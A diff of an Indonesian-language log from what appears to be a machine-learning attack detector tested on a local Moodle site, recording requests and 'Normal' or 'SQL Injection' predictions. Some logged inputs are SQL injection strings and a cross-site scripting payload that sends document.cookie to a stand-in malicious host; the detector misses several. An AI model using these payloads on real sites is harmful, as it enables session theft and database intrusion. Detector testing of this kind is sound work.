@@ -2204,7 +2204,7 @@
 2025-04-23 13:50:31,298 - INFO - [2025-04-23T13:50:31.297423] IP: ::1 | User-Agent: Tidak Diketahui | Input: {
     "method": "GET",
     "url": "/moodle/admin/search.php?query=%22SELECT+*+FROM+dontol+WHERE+username+%3D+%27%22+%2B+user_input%C2%A0%2B%C2%A0%22%27%22",
-    "body": "query=\"SELECT * FROM dontol WHERE username = '\" + user_input + \"'\""
+    "body": "query=\"SELECT * FROM dontol WHERE username = '\" + user_inputï¿½+ï¿½\"'\""
 }
 2025-04-23 13:50:31,718 - INFO - [2025-04-23T13:50:31.297423] Prediksi: Normal
 2025-04-23 13:50:31,719 - INFO - Hasil prediksi: {'prediction': 'Normal'}
@@ -2222,7 +2222,7 @@
 2025-04-23 13:51:12,537 - INFO - [2025-04-23T13:51:12.537375] IP: ::1 | User-Agent: Tidak Diketahui | Input: {
     "method": "GET",
     "url": "/moodle/admin/search.php?query=SELECT+*+FROM+dontol+WHERE+username+%3D+%27%27+OR%C2%A0%271%27%3D%271",
-    "body": "query=SELECT * FROM dontol WHERE username = '' OR '1'='1"
+    "body": "query=SELECT * FROM dontol WHERE username = '' ORï¿½'1'='1"
 }
 2025-04-23 13:51:14,333 - INFO - [2025-04-23T13:51:12.537375] Prediksi: Normal
 2025-04-23 13:51:14,335 - INFO - Hasil prediksi: {'prediction': 'Normal'}
@@ -2276,7 +2276,7 @@
         "sesskey": "fT2PbDLBUZ",
         "_qf__core_calendar_local_event_forms_create": "1",
         "mform_showmore_id_general": "0",
-        "name": "SELECT * FROM dontol WHERE username = '' OR '1'='1",
+        "name": "SELECT * FROM dontol WHERE username = '' ORï¿½'1'='1",
         "timestart": {
             "day": "23",
             "month": "4",
@@ -4093,7 +4093,7 @@
         "sesskey": "i5F3iOY6Rs",
         "_qf__core_calendar_local_event_forms_create": "1",
         "mform_showmore_id_general": "0",
-        "name": "SELECT * FROM dontol WHERE username = '' OR '1'='1'",
+        "name": "SELECT * FROM dontol WHERE username = '' ORï¿½'1'='1'",
         "timestart": {
             "day": "30",
             "month": "4",
@@ -8881,3 +8881,486 @@
 }
 2025-05-05 10:40:35,481 - INFO - [2025-05-05T10:40:35.451630] Prediksi: Normal
 2025-05-05 10:40:35,482 - INFO - Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:26:35,963 - INFO - [05/05/2025 11:26:35] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/?redirect=0",
+    "body": "redirect=0"
+}
+2025-05-05 11:26:35,963 - INFO - [05/05/2025 11:26:35] Prediksi: Normal
+2025-05-05 11:26:35,964 - INFO - [05/05/2025 11:26:35] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:26:47,528 - INFO - [05/05/2025 11:26:47] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/?redirect=0",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/?redirect=0",
+        "context": "2",
+        "submitted_at": "2025-05-05T04:26:50.286Z"
+    }
+}
+2025-05-05 11:26:47,529 - INFO - [05/05/2025 11:26:47] Prediksi: Normal
+2025-05-05 11:26:47,529 - INFO - [05/05/2025 11:26:47] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:26:57,341 - INFO - [05/05/2025 11:26:57] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/my/",
+    "body": ""
+}
+2025-05-05 11:26:57,341 - INFO - [05/05/2025 11:26:57] Prediksi: Normal
+2025-05-05 11:26:57,342 - INFO - [05/05/2025 11:26:57] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:27:00,453 - INFO - [05/05/2025 11:27:00] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/index.php",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/my/index.php",
+        "context": "5",
+        "submitted_at": "2025-05-05T04:27:03.258Z"
+    }
+}
+2025-05-05 11:27:00,454 - INFO - [05/05/2025 11:27:00] Prediksi: Normal
+2025-05-05 11:27:00,455 - INFO - [05/05/2025 11:27:00] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:27:11,500 - INFO - [05/05/2025 11:27:11] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "27"
+        },
+        "eventtype": "user",
+        "categoryid": "1",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "969032373"
+        },
+        "location": "",
+        "duration": "0",
+        "timedurationuntil": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "27"
+        },
+        "timedurationminutes": "",
+        "repeats": "1",
+        "submitted_at": "2025-05-05T04:27:14.323Z"
+    }
+}
+2025-05-05 11:27:11,500 - INFO - [05/05/2025 11:27:11] Prediksi: Normal
+2025-05-05 11:27:11,501 - INFO - [05/05/2025 11:27:11] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:27:17,703 - INFO - [05/05/2025 11:27:17] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "aaaaaaaaaaaaaa",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "27"
+        },
+        "eventtype": "user",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "969032373"
+        },
+        "location": "",
+        "duration": "0",
+        "submitted_at": "2025-05-05T04:27:20.497Z"
+    }
+}
+2025-05-05 11:27:17,703 - INFO - [05/05/2025 11:27:17] Prediksi: Normal
+2025-05-05 11:27:17,704 - INFO - [05/05/2025 11:27:17] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:35:51,976 - INFO - [05/05/2025 11:35:51] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "35"
+        },
+        "eventtype": "user",
+        "categoryid": "1",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "128110684"
+        },
+        "location": "",
+        "duration": "0",
+        "timedurationuntil": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "35"
+        },
+        "timedurationminutes": "",
+        "repeats": "1",
+        "submitted_at": "2025-05-05T04:35:54.776Z"
+    }
+}
+2025-05-05 11:35:51,976 - INFO - [05/05/2025 11:35:51] Prediksi: Normal
+2025-05-05 11:35:51,977 - INFO - [05/05/2025 11:35:51] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:35:54,587 - INFO - [05/05/2025 11:35:54] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "SELECT * FROM plugin_data WHERE course_id = '$_GET[courseid]';",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "35"
+        },
+        "eventtype": "user",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "128110684"
+        },
+        "location": "",
+        "duration": "0",
+        "submitted_at": "2025-05-05T04:35:57.416Z"
+    }
+}
+2025-05-05 11:35:54,587 - INFO - [05/05/2025 11:35:54] Prediksi: SQL Injection
+2025-05-05 11:35:54,588 - INFO - [05/05/2025 11:35:54] Hasil prediksi: {'prediction': 'SQL Injection'}
+2025-05-05 11:36:09,603 - INFO - [05/05/2025 11:36:09] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "36"
+        },
+        "eventtype": "user",
+        "categoryid": "1",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "50552144"
+        },
+        "location": "",
+        "duration": "0",
+        "timedurationuntil": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "36"
+        },
+        "timedurationminutes": "",
+        "repeats": "1",
+        "submitted_at": "2025-05-05T04:36:12.438Z"
+    }
+}
+2025-05-05 11:36:09,604 - INFO - [05/05/2025 11:36:09] Prediksi: Normal
+2025-05-05 11:36:09,604 - INFO - [05/05/2025 11:36:09] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:36:12,790 - INFO - [05/05/2025 11:36:12] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "SELECT * FROM mdl_course WHERE fullname LIKE '%$_GET[query]%';",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "36"
+        },
+        "eventtype": "user",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "50552144"
+        },
+        "location": "",
+        "duration": "0",
+        "submitted_at": "2025-05-05T04:36:15.614Z"
+    }
+}
+2025-05-05 11:36:12,791 - INFO - [05/05/2025 11:36:12] Prediksi: SQL Injection
+2025-05-05 11:36:12,793 - INFO - [05/05/2025 11:36:12] Hasil prediksi: {'prediction': 'SQL Injection'}
+2025-05-05 11:36:14,133 - INFO - [05/05/2025 11:36:14] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "SELECT * FROM mdl_course WHERE fullname LIKE '%$_GET[query]%';",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "36"
+        },
+        "eventtype": "user",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "50552144"
+        },
+        "location": "",
+        "duration": "0",
+        "submitted_at": "2025-05-05T04:36:16.824Z"
+    }
+}
+2025-05-05 11:36:14,134 - INFO - [05/05/2025 11:36:14] Prediksi: SQL Injection
+2025-05-05 11:36:14,134 - INFO - [05/05/2025 11:36:14] Hasil prediksi: {'prediction': 'SQL Injection'}
+2025-05-05 11:36:40,420 - INFO - [05/05/2025 11:36:40] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "36"
+        },
+        "eventtype": "user",
+        "categoryid": "1",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "74275726"
+        },
+        "location": "",
+        "duration": "0",
+        "timedurationuntil": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "36"
+        },
+        "timedurationminutes": "",
+        "repeats": "1",
+        "submitted_at": "2025-05-05T04:36:43.236Z"
+    }
+}
+2025-05-05 11:36:40,421 - INFO - [05/05/2025 11:36:40] Prediksi: Normal
+2025-05-05 11:36:40,421 - INFO - [05/05/2025 11:36:40] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:36:43,008 - INFO - [05/05/2025 11:36:42] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "Halo semuanya! Saya punya pertanyaan tentang materi ini. <script>fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);</script>",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "36"
+        },
+        "eventtype": "user",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "74275726"
+        },
+        "location": "",
+        "duration": "0",
+        "submitted_at": "2025-05-05T04:36:45.814Z"
+    }
+}
+2025-05-05 11:36:43,008 - INFO - [05/05/2025 11:36:42] Prediksi: Normal
+2025-05-05 11:36:43,009 - INFO - [05/05/2025 11:36:42] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:36:44,315 - INFO - [05/05/2025 11:36:44] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "Halo semuanya! Saya punya pertanyaan tentang materi ini. <script>fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);</script>",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "36"
+        },
+        "eventtype": "user",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "74275726"
+        },
+        "location": "",
+        "duration": "0",
+        "submitted_at": "2025-05-05T04:36:47.017Z"
+    }
+}
+2025-05-05 11:36:44,315 - INFO - [05/05/2025 11:36:44] Prediksi: Normal
+2025-05-05 11:36:44,316 - INFO - [05/05/2025 11:36:44] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:37:09,787 - INFO - [05/05/2025 11:37:09] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "37"
+        },
+        "eventtype": "user",
+        "categoryid": "1",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "177323363"
+        },
+        "location": "",
+        "duration": "0",
+        "timedurationuntil": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "37"
+        },
+        "timedurationminutes": "",
+        "repeats": "1",
+        "submitted_at": "2025-05-05T04:37:12.620Z"
+    }
+}
+2025-05-05 11:37:09,787 - INFO - [05/05/2025 11:37:09] Prediksi: Normal
+2025-05-05 11:37:09,788 - INFO - [05/05/2025 11:37:09] Hasil prediksi: {'prediction': 'Normal'}
+c
+2025-05-05 11:37:35,692 - INFO - [05/05/2025 11:37:35] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/calendar/view.php?view=day&time=1746378000&course=1",
+    "body": "view=day&time=1746378000&course=1"
+}
+2025-05-05 11:37:35,692 - INFO - [05/05/2025 11:37:35] Prediksi: Normal
+2025-05-05 11:37:35,693 - INFO - [05/05/2025 11:37:35] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:37:37,012 - INFO - [05/05/2025 11:37:36] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/calendar/view.php?view=day&time=1746378000",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/calendar/view.php?view=day&time=1746378000",
+        "context": "1",
+        "submitted_at": "2025-05-05T04:37:39.821Z"
+    }
+}
+2025-05-05 11:37:37,012 - INFO - [05/05/2025 11:37:36] Prediksi: Normal
+2025-05-05 11:37:37,013 - INFO - [05/05/2025 11:37:36] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:37:57,380 - INFO - [05/05/2025 11:37:57] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/index.php",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/my/index.php",
+        "context": "5",
+        "submitted_at": "2025-05-05T04:38:00.041Z"
+    }
+}
+2025-05-05 11:37:57,380 - INFO - [05/05/2025 11:37:57] Prediksi: Normal
+2025-05-05 11:37:57,381 - INFO - [05/05/2025 11:37:57] Hasil prediksi: {'prediction': 'Normal'}
